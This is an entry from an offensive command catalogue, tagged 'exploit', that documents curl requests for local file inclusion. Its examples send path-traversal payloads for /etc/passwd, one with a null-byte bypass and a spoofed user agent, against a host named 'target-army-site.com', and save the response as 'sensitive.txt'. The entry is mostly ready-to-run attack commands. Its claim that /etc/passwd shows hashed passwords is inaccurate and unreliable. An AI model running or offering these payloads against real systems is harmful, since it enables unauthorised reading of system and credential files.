---
id: cmd-curl-fetch-url
data: 'curl "https://target.com/vulnerable?param=../file" -o output.txt'
tags:
  - web
  - recon
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:22.762Z'
verified: false
validated: true
submitted: true
---
# curl-fetch-url

## Command

```bash
curl "https://target.com/vulnerable?param=../file" -o output.txt
```

## Description

This command uses curl to fetch content from a URL, commonly used to test web vulnerabilities like LFI by sending crafted payloads and saving responses for analysis.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | The target URL with payload | Yes |
| -o | Output file to save response | No |
| --user-agent | Custom user agent string | No |

## Examples

### Basic Usage

```bash
curl "https://target-army-site.com/include.php?file=../../../etc/passwd"
```

### Advanced Usage

```bash
curl "https://target-army-site.com/include.php?file=../../../etc/passwd%00" -o sensitive.txt -A "Mozilla/5.0"
```

## Expected Output

The command outputs the raw HTTP response body to stdout or the specified file. For a successful LFI, it displays the contents of the targeted file, such as hashed passwords from /etc/passwd. Errors like 404 or 403 indicate failure.

## Related

- [[Related Procedure|procedures/Exploit-LFI-via-URL-Traversal]]
